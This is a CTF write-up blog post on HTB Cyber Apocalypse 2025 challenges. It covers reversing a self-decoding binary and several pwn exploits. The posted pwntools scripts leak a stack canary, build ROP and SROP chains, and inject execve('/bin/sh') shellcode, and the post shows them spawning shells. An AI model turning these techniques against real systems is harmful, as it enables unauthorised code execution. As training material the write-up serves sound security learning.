+++
title = "Ctf Htb Cyberapocalypse 2025"
date = "2025-03-26T15:34:36+01:00"
author = "yocvito"
authorTwitter = "" #do not include @
cover = ""
tags = ["write-up", "HTB-cyberapocalypse-2025", "re", "pwn"]
keywords = ["ctf", "write-up", "HTB-cyberapocalypse-2025", "re", "pwn"]
description = "Some write-ups for the HTB Cyberapocalypse 2025 CTF"
showFullContent = false
readingTime = false
hideComments = false
+++


We attempted this CTF as a team of 8 members, mainly not CTF players but with complementary skillset. This allows us to be ranked **211th** while not really try harding it.

{{< custom-toc >}}

## RE - Endless Cycle

### Analysis

We open the binary in IDA and look at the `main` function. It just `mmap` some memory, writes random values to it before executing that memory and looking if the return value is `1`.

```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned __int64 i; // [rsp+0h] [rbp-20h]
  unsigned __int64 j; // [rsp+8h] [rbp-18h]
  char *mmaped; // [rsp+10h] [rbp-10h]

  mmaped = (char *)mmap(0LL, 0x9EuLL, 7, 33, -1, 0LL);// 7=PROT_ALL, 33=MAP_ANON|MAP_SHARED
  srand(seed);
  for ( i = 0LL; i <= 0x9D; ++i )
  {
    for ( j = 0LL; j < dword_4040[i]; ++j )
      rand();
    mmaped[i] = rand();
  }
  if ( ((unsigned int (*)(void))mmaped)() == 1 )
    puts("You catch a brief glimpse of the Dragon's Heart - the truth has been revealed to you");
  else
    puts("The mysteries of the universe remain closed to you...");
  return 0LL;
}
```

We clearly see that the mmap-ed memory content is defined by the `seed` which is supplied to `srand()`. This value defines the sequence of random values that will be given by call to `rand()`. We also understand that the program drift the random sequence to only select the one values that interest it (the one that holds the instruction bytecode to write to the mmap-ed region).

Using this knowledge, we can craft a simple C program that will generate such code (we could also run the binary in a debugger, put a breakpoint before the final check and extract memory):

```C
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int seed = 0x0CFD2BC5B;
int drifts[158] = {0xc, 0x70, 0x27, 0xe8, 0x8e, 0x55, 0x20, 0x2a1, 0x39, 0x21, 0x70, 0x32e, 0x167, 0x251, 0xf3, 0x1e9, 0x328, 0x5d, 0x1a2, 0x2e6, 0x49, 0x7c, 0x177, 0x61, 0xf9, 0x1a, 0x1cb, 0x150, 0x4a, 0x38, 0xb9, 0x2a, 0xf5, 0xc4, 0xe, 0x15d, 0x12, 0x8f, 0x10, 0x17c, 0x46, 0x7, 0x5, 0x2bf, 0x9, 0x340, 0xbf, 0x69, 0x178, 0x19a, 0x58, 0x299, 0x37, 0x6a, 0x163, 0x41, 0x10e, 0x29, 0x36, 0x22f, 0x69, 0x8, 0x63, 0xc6, 0xee, 0xfc, 0x3b, 0x5b, 0x21, 0x24, 0x9b, 0x42, 0xba, 0xc1, 0x46, 0x266, 0x1dc, 0x4d, 0x6, 0x23, 0x0, 0x123, 0x2c, 0x42, 0x116, 0xd3, 0xed, 0xd6, 0x9f, 0x15, 0xa2, 0xe9, 0x253, 0x47, 0x305, 0x124, 0x244, 0x58, 0xbe, 0x1b, 0x1b1, 0x1b, 0x45, 0x27, 0xcd, 0x6c, 0x97, 0x2e7, 0x3d7, 0xee, 0x576, 0x73, 0x10f, 0x1c5, 0x7f, 0xa6, 0xc5, 0x35c, 0x20f, 0x23, 0x14e, 0xf1, 0x104, 0x1fe, 0xf, 0x67, 0x233, 0xfd, 0x104, 0x94, 0x1c4, 0xf0, 0x8c, 0x2b, 0x96, 0x14, 0xc8, 0xde, 0x1dc, 0x0, 0x137, 0x61, 0x16, 0x57, 0x266, 0x44d, 0x183, 0x22, 0x20, 0xd6, 0x16a, 0x2b, 0x154, 0xa5, 0xa4, 0x12a, 0x13f, 0x2e2};

int
main(void)
{
	char buf[0x100] = { 0 };
	srand(seed);
	for (int i = 0LL; i <= 0x9D; ++i )
  {
    for (int j = 0LL; j < drifts[i]; ++j )
      rand();
	buf[i] = rand();
  }

	int fd = open("endless-cycle-2nd-part.bin", O_WRONLY|O_CREAT);
	if (fd < 0) {
		perror("open");
		exit(1);
	}
	write(fd, buf, 0x100);
	close(fd);

	return 0;

}
```

We compile this program, run it and get the 2nd part of the challenge to analyze:
```shell
$ ./solve
$ xxd endless-cycle-2nd-part.bin 
00000000: 5548 89e5 683e 2101 0181 3424 0101 0101  UH..h>!...4$....
00000010: 48b8 7468 6520 666c 6167 5048 b857 6861  H.the flagPH.Wha
00000020: 7420 6973 2050 6a01 586a 015f 6a12 5a48  t is Pj.Xj._j.ZH
00000030: 89e6 0f05 4881 ec00 0100 0049 89e4 31c0  ....H......I..1.
00000040: 31ff 31d2 b601 4c89 e60f 0548 85c0 7e32  1.1...L....H..~2
00000050: 6a1a 584c 89e1 4801 c881 31fe caef be48  j.XL..H...1....H
00000060: 83c1 0448 39c1 72f1 4c89 e748 8d35 1200  ...H9.r.L..H.5..
00000070: 0000 48c7 c11a 0000 00fc f3a6 0f94 c00f  ..H.............
00000080: b6c0 c9c3 b69e adc5 92fa dfd5 a1a8 dcc7  ................
00000090: cea4 8be1 8aa2 dce1 89fa 9dd2 9ab7 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

We can also open this raw binary in IDA to analyze it (make sure to select 64-bits arch). The code is pretty simple, it displays a message asking for the flag, retrieves the user input, and xor it with hardcoded values before comparing it to some memory values.

![code 2nd part](/img/ctf-htb-cyberapo2025/endless-cycle-2nd-part-bin.png)

We dump the final password in IDA:
```python
Python> get_bytes(0x84, 26)
b'\xb6\x9e\xad\xc5\x92\xfa\xdf\xd5\xa1\xa8\xdc\xc7\xce\xa4\x8b\xe1\x8a\xa2\xdc\xe1\x89\xfa\x9d\xd2\x9a\xb7'
```

And it can be reversed easely with some python scripting:
```python
from pwn import *

context.endian = 'little'
context.bits = 64

passwd = b'\xb6\x9e\xad\xc5\x92\xfa\xdf\xd5\xa1\xa8\xdc\xc7\xce\xa4\x8b\xe1\x8a\xa2\xdc\xe1\x89\xfa\x9d\xd2\x9a\xb7'
plain_chunked  = [p32(u32(passwd[i:i+4].ljust(4, b'\x00')) ^ 0xbeefcafe) for i in range(0, len(passwd), 4)]
plain = b''.join(plain_chunked)
print(plain)
```

This gives us the flag:
```shell
$ python3 solve.py
b'HTB{XXX}\xef\xbe'
```

## PWN - Quack Quack

### Enumeration

The binary is dynamically linked and not stripped. It has various protections enabled:
```shell
$  checksec quack_quack 
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

More importantly, we notice binary isn't PIE (meaning we can pre-calculate adresses of the binary functions, data, etc...)

### Analysis

By looking at the `main()`, it simply calls the `duckling()` function which holds all the program logic. The program allocates a stack buffer `buf` of `110` bytes. 
It then reads a first user input into it and checks if it holds the string `"Quack Quack"` and exists otherwise. After that it prints a string at the location `v1+32` (where `v1` points to the `Quack Quack` occurence in the stack buffer. Finally, it reads 106 characters from `buf+32` but as the buffer is only `110` bytes large, this overflow the buffer by `28` bytes, writting beyond its limit and overflowing next variables (canary and returna ddress most importantly).

```C
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  char buf[110]; // [rsp+10h] [rbp-80h] BYREF
  unsigned __int64 canary; // [rsp+88h] [rbp-8h]

  canary = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 102uLL);
  v1 = strstr(buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, &buf[32], 106uLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return canary - __readfsqword(0x28u);
}
```

So we have a buffer overflow which could allow us redirect the program control flow, but the stack cookies (canary) forbid us from doing so by placing random values onto the stack at runtime. this means that if we are
not able to retrieve the random value and place it at the right location during the overflow, the program will abort and exploitation would fail.

### Exploitation

Looking at the stack frame layout of `duckling()`, we see that the canary is `120` bytes far from the buffer start address. This means that using the pointer dereference from the `Quack Quack` string in the buffer printing part could allow us reading this canary value (because `102 + 32 > 120`). By carefully placing the `Quack Quack` string in our input, we can make sure to leak the canary value in the `printf()` call.

So this allows us to bypass the canary and place an address into the stack frame return address location, so that we divert control flow. But we should find something to call first. In the program, there is a `duck_attack()` function which reads and print out the flag. We will juste perform a `ret2win` to retrieve the flag !

Using the following exploit script, we leak the canary and exploit the buffer overflow to call the later function:
```python
from pwn import *
import argparse

context.arch = 'amd64'
context.bits = '64'
context.endian = 'little'

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    parser.add_argument('-b', '--binary', help='local binary path', required=True)

    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(args.binary)

    win_ea = binary.symbols.duck_attack

    off_to_canary_1 = 88+32
    off_to_canary_2 = 88
    should_land_ptr = off_to_canary_1+1-32
    payload = b"A"*should_land_ptr
    payload += b"Quack Quack "
   
    print(len(payload), payload)
    p.recvuntil(b"Quack the Duck!\n\n> ", timeout=1)

    p.send(payload)

    p.recvuntil(b'Quack Quack ')
    leak_str = p.recvline().strip().split(b', ready')[0].replace(b"A"*(off_to_canary_1+1-len(b"Quack Quack ")), b"")[:7]
    print(leak_str)
    canary_leak = u64(b"\x00" + leak_str)
    print('[+] canary = ', hex(canary_leak))

    payload = b'A'*off_to_canary_2
    payload += p64(canary_leak)
    payload += b'A'*8
    payload += p64(win_ea)


    p.send(payload)

    p.interactive() # will print flag
```

Running the script gives us the flag:
```shell
$ python3 exploit.py -b ./quack_quack remote 94.237.57.171 43784
[+] Opening connection to 94.237.57.171 on port 43784: Done
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
101 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack '
b'T\xbd\x08\xa4\x92O)'
[+] canary =  0x294f92a408bd5400
[*] Switching to interactive mode

> Did you really expect to win a fight against a Duck?!
https://yocvito.github.io/posts/ctf-htb-cyberapocalypse-2025/
HTB{XXX}
```


## PWN - Blessing

### Enumeration

Binary is dynamically linked and not stripped. It has following security mechanisms enabled:
```shell
$ checksec blessing
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Analysis

We open the binary in IDA. We see that the `main()` function allocates a big buffer on the heap (which is actually mmaped instead of being located on heap), and writes a boolean flag at this location. If this flag is
**false (0)** at the end of the program, then it displays the flag.

Moreover, the program reads a **size** as well as a **buffer** of the respecting length from user input.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  char *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0LL;
  v6 = malloc(0x30000uLL);
  *v6 = 1LL;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0LL; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = (char *)malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)&buf[size - 1] = 0LL;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```

As PIE (and likely ASLR) are enabled, the program gives us a memory leak (the address of the boolean flag) so that we can attack the program
without having to cause a leak by ourself. So now, we need to think of a way to modify the boolean flag value to set it to **0**.


### Exploitation

We can notice that if the `malloc()` used to allocated our input fails, then the program would write a zero value (8 bytes) at the `size` location (because `*&0[size-1] <=> *(size-1)`).
So if we can make sure the malloc call fail as we supplly `@bool_flag-1` as a size, and to not write bytes at the `buf` location in the following `read()`, then the program would overwrite
the boolean flag value with 0, allowing us to print the flag.

We write the following exploit script to do so:
```python
from pwn import *
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')
    parser_local.add_argument('binary')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)


    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    p.recvuntil(b'accept this: ')
    leak = int(p.recv(timeout=0.9), 16)
    print(leak)

    print(p.recvuntil(b'length: '))
    p.sendline(str(leak).encode())
    time.sleep(0.1)
    print(p.recvuntil(b'me the song: '))
    time.sleep(0.5)
    p.sendline(b"")

    flag = p.recvall()
    print(flag)
```

Running the script gives us the flag:
```shell
$ python3 exploit.py local ./blessing
[+] Starting local process './blessing': pid 74709
140453500518416
b"\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\n\n\x1b[1;34m[\x1b[1;32mBard\x1b[1;34m]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: "
b'\n\x1b[1;34m[\x1b[1;32mBard\x1b[1;34m]: Excellent! Now tell me the song: '
[+] Receiving all data: Done (27B)
[*] Process './blessing' stopped with exit code 0 (pid 74709)
b'HTB{f4k3_fl4g_f0r_t35t1ng}\n'
```

## PWN - Crossbow

### Enumeration

Binary is statically linked and not stripped. It has following security mechanisms enabled:
```shell
checksec crossbow
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

### Analysis

When we open the binary in IDA, we notice the `main()` function simply calls `training()`, which will allocates a stack buffer and finally call `target_dummy(stack_buffer)`. The later works as the following, it request an integer value from the user (the `target`) and then offset the argument stack buffer using `target` to store it a heap allocated pointer. Finally, it reads **128** bytes from the user and stores them in this heap buffer.

```C
__int64 __fastcall target_dummy(char *input)
{
  int v1; // r8d
  int v2; // r9d
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // r8d
  int v8; // r9d
  char *ptr; // rbx
  int v10; // r8d
  int v11; // r9d
  __int64 result; // rax
  int v13; // r8d
  int v14; // r9d
  int target; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v1,
    v2);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&target, v3, v4, v5, v6) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v7,
      v8);
    exit(1312LL);
  }
  ptr = &input[8 * target];
  *(_QWORD *)ptr = calloc(1LL, 0x80LL);
  if ( !*(_QWORD *)ptr )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(6969LL);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v10,
    v11);
  result = fgets_unlocked(*(_QWORD *)&input[8 * target], 128LL, &stdin_FILE);
  if ( !result )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(69LL);
  }
  return result;
}
```

There is important things to notice here in order to unveil the exploitation path: 
- `target` is **not checked**, it can be supply a value that overflow the stack buffer and override stack control flow values
- `target` is a **signed integer**, allowing us to offset the stack buffer negatively (and corrupt upper stack frames)
- the heap memory at `ptr` is **not executable**, thus we cannot simply override return address with this pointer
- the `training` and `target_dummy` functions uses stack cleaning instruction `leave` which is equivalent to `mov rsp, rbp; pop rbp;`
    - this could allow us corrupting these 2 registers

### Exploitation

The idea for exploiting this program is the following:
1. supply a `target` that would make the heap allocated pointer land on the location where `RBP` is stored in current stack frame (`target_dummy`)
2. supply a ROPchain in the heap memory for spawning `execve("/bin/sh", 0, 0)`
3. `target_dummy` return and corrupt `RBP` (now points to heap location at `ptr`)
4. `training` return and corrupt `RSP` (same)
5. The program returns from the value at `RSP`

The ROPchain for spawning the shell does the following:
1. write `"/bin/sh\0"` to a writable location in the binary (possible because non PIE)
2. craft arguments to `execve` (`rdi=@binsh`, `rsi=0`, `rdx=0`)
3. make a syscall

Chaining this together, we build the following exploit code:
```python
from pwn import *
import argparse
import binascii

context.arch = 'amd64'
context.endian = 'little'

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    parser.add_argument('-b', '--binary', help='local binary path', required=True)


    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(args.binary)
    rop = ROP(binary)

    # craft a ropchain that holds "/bin/sh\0",
    # and will call execve("/bin/sh")
    rop = ROP(binary)
    
    g_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    g_pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    g_pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
    g_pop_rax = rop.find_gadget(["pop rax", "ret"]).address
    g_syscall = rop.find_gadget(["syscall", "ret"]).address
    g_mov_prdi_rax= 0x4020f5

    print('[+] Gadgets:')
    print('[-] @g_pop_rdi       :', hex(g_pop_rdi))
    print('[-] @g_pop_rsi       :', hex(g_pop_rsi))
    print('[-] @g_pop_rdx       :', hex(g_pop_rdx))
    print('[-] @g_pop_rax       :', hex(g_pop_rax))
    print('[-] @g_syscall       :', hex(g_syscall))

    writable_ea = 0x40E298

    binsh_packed = bytes(list(reversed(b"/bin/sh\x00")))

    payload = flat(
        p64(0xdeadbeef),
        p64(g_pop_rax), # rbp/rsp points here at the beginning
        b"/bin/sh\x00",
        p64(g_pop_rdi),
        p64(writable_ea),
        p64(g_mov_prdi_rax),
        # execve ropchain
        p64(g_pop_rsi),
        p64(0),
        p64(g_pop_rdx),
        p64(0),
        p64(g_pop_rax),
        p64(0x3b),
        p64(g_syscall),
    )

    off_to_rbp_ptr = -2

    input('type enter to exploit')
    p.recvuntil(b'target to shoot: ')
    p.sendline(str(off_to_rbp_ptr).encode())

    input('type enter to continue')

    p.sendline(payload)

    p.interactive()
```

Running it allows us to get the flag:
```shell
python3 exploit.py -b ./crossbow local
[+] Starting local process './crossbow': pid 132625
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[*] Loaded 57 cached gadgets for './crossbow'
[+] Gadgets:
[-] @g_pop_rdi       : 0x401d6c
[-] @g_pop_rsi       : 0x40566b
[-] @g_pop_rdx       : 0x401139
[-] @g_pop_rax       : 0x401001
[-] @g_syscall       : 0x404b51
type enter to exploit
type enter to continue
[*] Switching to interactive mode

[Sir Alaric]: Give me your best warcry!!

> 
[Sir Alaric]: That was quite a shot!!

$ cat flag.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

## PWN - Laconic

### Enumeration

Th binary is statically linked, and not stripped. The binary in itself has no security protections:
```shell
checksec laconic
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

### Analysis

When reversing the binary in IDA, we notice a very simple logic. The program just makes a `sys_read(0, rsp-8, 0x106)`. 

This effectively provide us with a direct buffer overflow onto the stack, but as the program doesn't hold interesting functions or gadgets nor load interesting libraries, we can't simply ROP or ret2win. We will have to design a proper exploit that deal with the program restrictions (limited read size, low gadgets).

![disass laconic](/img/ctf-htb-cyberapo2025/laconic-disass.png)

### Exploitation

What we notice is that the program actually gives us one interesting gadget we show in the disassembly view above (the `pop rax; ret`). This gadget grant us with the possibility to specify a syscall to make when calling the `syscall; retn;` gadget.

The problem is that there is no relevant gadgets to get control over the necessary registers to spawn a shell (`rdi`, `rsi` and `rdx`) when calling the `execve` syscall using gadgets above. So we get control over those registers ? The answer is [**SROP**](https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=6956568).

Using SROP, we are able to place a fake **sigreturn frame** that is typically called when returning from a signal handler (this is used to keep track of the context where we were executing code before jumping to the signal handler). If we can call the `sigreturn` syscall, then the program would gracefully handle our sigreturn frame and branch accordingly. As the program provides a gadget for setting `rax`, we are able make this syscall from the buffer overflow vulnerability. We will not dive extensively into SROP internals and assume the reader already know about that.

Using an SROP, we can trigger a syscall of our choice but calling `execve("/bin/sh", 0, 0)` is not yet possible (because the `"/bin/sh"` string doesn't exist in the binary. Instead of trying this directly, we can take advantage of the fact that the `.text` segment is writable. We will use the SROP to call a `read` syscall which allows us to write a shellcode directly in the text segment, and taking care of redirecting `RSP` to a location that holds a pointer to our shellcode (we should also make sure we don't overwrite the original code, so that the 2 usefull gadgets we use doesn't get overriden in the middle of the exploit).

Here is a schematic for illustrating the layout we aim to reach in the exploitation:

![exploit plan schematic](/img/ctf-htb-cyberapo2025/laconic-memory.png)


Chaining it together, we build the following exploit code (I used [this small shellcode](https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html)):
```python
from pwn import *
import argparse

context.binary = './laconic'

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    parser.add_argument('-b', '--binary', help='local binary path', required=True)

    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
        #p = gdb.debug(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(args.binary)
    rop = ROP(binary)

    g_syscall = rop.find_gadget(['syscall', 'ret'])[0]
    g_pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    print('[+] syscall gadget:', hex(g_syscall))

    scb = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
    scb = scb.ljust(64, b'\x90')
    padded_len = 64
    print(padded_len, scb)

    print('[+] RSP will land at', hex(binary.symbols._start + 0x20 + padded_len))
    srop = SigreturnFrame(kernel='amd64')
    srop.rdi = 0
    srop.rsi = binary.symbols._start + 0x20
    srop.rdx = padded_len + 8
    srop.rsp = binary.symbols._start + 0x20 + padded_len 
    srop.rip = g_syscall
    srop.rax = 0

    payload = p64(0xdeadbeef)
    payload += p64(g_pop_rax)
    payload += p64(0xf)
    payload += p64(g_syscall)
    payload += bytes(srop)

    print(len(payload), payload)
    p.send(payload[:0x106])

    payload2 = scb +  p64(binary.symbols._start + 0x20)
    print(len(payload2), payload2)
    p.send(payload2)


    p.interactive()
```

Running it gives us the flag:
```shell
python3 exploit.py -b ./laconic local
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x42000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Starting local process './laconic': pid 200537
[*] Loaded 3 cached gadgets for './laconic'
[+] syscall gadget: 0x43015
64 b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[+] RSP will land at 0x43060
280 b'\xef\xbe\xad\xde\x00\x00\x00\x00\x180\x04\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x150\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`0\x04\x00\x00\x00\x00\x00\x150\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
72 b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90 0\x04\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
$ cat flag.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

## PWN - Contractor

**_Work In Progress_**

```python
from pwn import *
import argparse
import time

context.binary = "./contractor"

OFF_VERIFIED_TO_RET = 0x24
OFF_VERIFIED_TO_LSB = 0x4

def try_override_verified(off):
    choice = None
    if off < 0x10:
        p.sendline(b'1')
        choice = 1
        base = 0
        time.sleep(0.1)
        print(p.recvuntil(b'name again: '))
        if off == 0xc:
            p.send(b'A'*off + p32(0))
        else:
            p.sendline(b'A'*off + p32(0))
    elif 0x10 <= off < 0x110:
        p.sendline(b'2')
        choice = 2
        base = 0x10
        time.sleep(0.1)
        print(p.recvuntil(b'reason again please: '))
        if off == 0x10c:
            p.send(b'A' * (off - base) + p32(0))
        else:
            p.sendline(b'A' * (off - base) + p32(0))
    elif 0x110 <= off < 0x114:
        p.sendline(b'3')
        choice = 3
        base = 0x110
        time.sleep(0.1)
        print(p.recvuntil(b'specify again: '))
        p.sendline(b'0')
    elif 0x114 <= off < 0x118:
        print('[!] WARNING: cannot be handled (prepare to cry)')
        return
    elif 0x118 <= off < 0x128:
        p.sendline(b'4')
        choice = 4
        base = 0x118
        time.sleep(0.1)
        print(p.recvuntil(b'you good at: '))
        if off == 0x11c:
            p.send(b'A' * (off - base) + p32(0))
        else:
            p.sendline(b'A' * (off - base) + p32(0))
    else:
        raise Exception('wtf bro')

    time.sleep(0.1)
    resp=p.recv(timeout=0.5)
    if b'everything is correct now?\n\n> ' in resp:
        print('[+] Got a hit at offset ' + hex(off))
